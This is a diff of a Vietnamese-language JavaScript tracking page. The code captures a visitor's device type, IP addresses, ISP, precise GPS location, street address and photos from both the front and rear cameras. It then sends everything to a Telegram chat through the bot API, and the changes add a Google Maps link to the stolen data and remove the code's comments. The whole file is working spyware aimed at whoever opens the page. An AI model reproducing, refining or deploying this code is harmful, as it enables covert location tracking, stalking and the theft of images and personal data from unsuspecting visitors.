@@ -17,7 +17,6 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
-// Nhận diện thiết bị
 function detectDevice() {
   const ua = navigator.userAgent;
   if (/iPhone|iPad|iPod/i.test(ua)) {
@@ -39,13 +38,11 @@ function detectDevice() {
   }
 }
 
-// Lấy IP dân cư
 async function getPublicIP() {
   const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
   info.ip = ip.ip || 'Không rõ';
 }
 
-// Lấy IP thật (gốc từ Cloudflare)
 async function getRealIP() {
   const ip = await fetch('https://icanhazip.com').then(r => r.text());
   info.realIp = ip.trim();
@@ -53,13 +50,15 @@ async function getRealIP() {
   info.isp = data.connection?.org || 'Không rõ';
 }
 
-// Lấy địa chỉ từ GPS nếu có, nếu không thì dùng địa chỉ IP gốc
-function getLocation() {
+let useGPS = false;
+
+async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
 
     navigator.geolocation.getCurrentPosition(
       async pos => {
+        useGPS = true;
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
         try {
@@ -67,7 +66,7 @@ function getLocation() {
             headers: { 'User-Agent': 'Mozilla/5.0' }
           });
           const data = await res.json();
-          info.address = data.display_name || '📍 Không rõ địa chỉ từ GPS';
+          info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
           info.country = data.address?.country || 'Không rõ';
         } catch {
           info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
@@ -76,24 +75,23 @@ function getLocation() {
         resolve();
       },
       async () => {
+        useGPS = false;
         await fallbackIPLocation();
         resolve();
       },
-      { enableHighAccuracy: true, timeout: 7000 }
+      { enableHighAccuracy: true, timeout: 8000 }
     );
   });
 }
 
-// Fallback IP location
 async function fallbackIPLocation() {
-  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
+  const data = await fetch(`https://ipwho.is/`).then(r => r.json());
   info.lat = data.latitude?.toFixed(6) || '0';
   info.lon = data.longitude?.toFixed(6) || '0';
   info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
   info.country = data.country || 'Không rõ';
 }
 
-// Chụp ảnh từ camera
 function captureCamera(facingMode = 'user') {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode } })
@@ -118,8 +116,11 @@ function captureCamera(facingMode = 'user') {
   });
 }
 
-// Tạo caption gửi về
 function getCaption() {
+  const mapsLink = info.lat && info.lon
+    ? `https://maps.google.com/?q=${info.lat},${info.lon}`
+    : 'Không rõ';
+
   return `
 📡 [THÔNG TIN TRUY CẬP]
 
@@ -133,11 +134,11 @@ function getCaption() {
 🌎 Quốc gia: ${info.country}
 📍 Vĩ độ: ${info.lat}
 📍 Kinh độ: ${info.lon}
+📌 Vị trí Google Maps: ${mapsLink}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
-// Gửi ảnh về Telegram
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -151,7 +152,6 @@ async function sendPhotos(frontBlob, backBlob) {
   return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
 }
 
-// Gửi text nếu không có ảnh
 async function sendTextOnly() {
   return fetch(API_SEND_TEXT, {
     method: 'POST',
@@ -163,7 +163,6 @@ async function sendTextOnly() {
   });
 }
 
-// Bắt đầu
 async function main() {
   detectDevice();
   await getPublicIP();
